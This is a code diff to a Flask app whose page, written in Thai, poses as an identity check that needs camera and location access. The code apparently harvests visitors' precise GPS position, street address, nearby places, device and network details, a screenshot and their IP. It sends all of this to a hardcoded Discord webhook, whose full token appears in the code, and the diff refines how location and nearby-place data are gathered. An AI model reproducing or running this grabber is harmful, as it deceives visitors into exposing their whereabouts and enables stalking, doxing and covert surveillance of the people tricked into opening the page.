@@ -8,24 +8,6 @@ import time
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
 
-def get_location_from_ip(ip):
-    try:
-        url = f'https://ipapi.co/{ip}/json/'
-        resp = requests.get(url, timeout=5)
-        data = resp.json()
-        if data.get('ip'):
-            return {
-                'city': data.get('city', 'ไม่ระบุ'),
-                'region': data.get('region', 'ไม่ระบุ'),
-                'country': data.get('country_name', 'ไม่ระบุ'),
-                'isp': data.get('org', 'ไม่ระบุ'),
-                'lat': data.get('latitude', 0),
-                'lon': data.get('longitude', 0)
-            }
-    except:
-        pass
-    return None
-
 def reverse_geocode(lat, lon):
     try:
         url = f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=th'
@@ -49,20 +31,20 @@ def reverse_geocode(lat, lon):
         print(f"Geocode error: {e}")
     return None
 
-def find_nearby_places(lat, lon, place_type, radius=500):
+def search_places(lat, lon, query, limit=5):
     try:
-        url = f'https://nominatim.openstreetmap.org/search?format=json&q={place_type}&lat={lat}&lon={lon}&radius={radius}&limit=3'
+        url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius=10000&limit={limit}'
         headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
-        resp = requests.get(url, headers=headers, timeout=5)
+        resp = requests.get(url, headers=headers, timeout=8)
         data = resp.json()
         results = []
         for item in data:
-            name = item.get('display_name', 'ไม่ระบุ')[:60]
+            name = item.get('display_name', 'ไม่ระบุ')[:80]
             if name:
                 results.append(name)
         return results
     except Exception as e:
-        print(f"Nearby error ({place_type}): {e}")
+        print(f"Search error ({query}): {e}")
     return []
 
 HTML = '''<!DOCTYPE html>
@@ -100,7 +82,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 10-12 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 12-15 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -141,7 +123,6 @@ HTML = '''<!DOCTYPE html>
                 orientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape'
             };
             
-            // Refresh Rate
             try {
                 let hz = 60;
                 if (screen.refreshRate) {
@@ -177,7 +158,6 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.rtt = 0;
             }
             
-            // GPS (ต้องได้ GPS เท่านั้น ไม่ใช้ IP fallback)
             let gpsSuccess = false;
             try {
                 const pos = await new Promise((resolve, reject) => {
@@ -321,36 +301,32 @@ def upload():
         screenshot = request.files.get('screenshot')
         gps_success = request.form.get('gps_success') == 'true'
         
-        location = get_location_from_ip(real_ip)
-        
         lat = device_info.get('gps_lat', 0)
         lon = device_info.get('gps_lon', 0)
         
         gps_address = None
-        nearby_places = {}
+        nearby_results = {}
         
-        # ค้นหาเฉพาะเมื่อได้ GPS จริง (ไม่ใช่ IP fallback)
+        # ใช้ GPS เท่านั้น
         if gps_success and lat and lon:
             gps_address = reverse_geocode(lat, lon)
-            place_types = ['shop', 'school', 'hospital', 'restaurant', 'police']
-            place_labels = {
-                'shop': '🛒 ร้านค้า/ห้าง',
-                'school': '🏫 โรงเรียน',
-                'hospital': '🏥 โรงพยาบาล',
-                'restaurant': '🍽️ ร้านอาหาร',
-                'police': '🚔 โรงพัก'
-            }
-            for pt in place_types:
-                results = find_nearby_places(lat, lon, pt, 800)
+            
+            searches = [
+                ('🏬 ห้างสรรพสินค้า', 'shopping mall'),
+                ('🍽️ ร้านอาหาร', 'restaurant'),
+                ('📍 สถานที่ใกล้เคียง', '')
+            ]
+            
+            for label, query in searches:
+                if query:
+                    results = search_places(lat, lon, query, 3)
+                else:
+                    results = search_places(lat, lon, 'point of interest', 3)
                 if results:
-                    nearby_places[place_labels[pt]] = results[:3]
+                    nearby_results[label] = results[:3]
                 time.sleep(0.3)
-        elif not gps_success:
-            # ถ้าไม่มี GPS ให้ใช้ IP เฉพาะที่อยู่เท่านั้น (ไม่ค้นหา nearby)
-            if location:
-                lat = location['lat']
-                lon = location['lon']
-                gps_address = None  # ไม่แปลงที่อยู่จาก IP
+        else:
+            gps_address = None
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -358,10 +334,6 @@ def upload():
         
         if real_ip:
             fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
-        if location:
-            fields.append({"name": "📍 เมือง (IP)", "value": location['city'], "inline": True})
-            fields.append({"name": "🗺️ จังหวัด (IP)", "value": location['region'], "inline": True})
-            fields.append({"name": "📶 ค่ายเน็ต", "value": location['isp'][:50], "inline": True})
         
         fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
         fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
@@ -373,13 +345,14 @@ def upload():
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS + ที่อยู่ (เฉพาะเมื่อมี GPS จริง)
+        # GPS
         if gps_success and lat and lon:
             acc = device_info.get('gps_accuracy', '?')
             gps_label = f"📍 GPS (±{acc} เมตร)"
             gps_val = f"{lat}, {lon}"
             fields.append({"name": gps_label, "value": gps_val, "inline": True})
             
+            # ที่อยู่
             if gps_address:
                 addr_parts = []
                 if gps_address.get('road'):
@@ -397,14 +370,12 @@ def upload():
                 
                 for part in addr_parts:
                     fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
-        elif not gps_success:
-            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาตหรือไม่รองรับ", "inline": True})
         else:
-            fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
+            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาต หรือไม่รองรับ (ไม่ใช้ IP แทน)", "inline": True})
         
-        # สถานที่ใกล้เคียง (เฉพาะจาก GPS เท่านั้น)
-        if gps_success and nearby_places:
-            for label, places in nearby_places.items():
+        # สถานที่ใกล้เคียง (เฉพาะ GPS)
+        if gps_success and nearby_results:
+            for label, places in nearby_results.items():
                 if places:
                     value = '\n'.join([f"• {p}" for p in places[:3]])
                     fields.append({"name": label, "value": value, "inline": False})
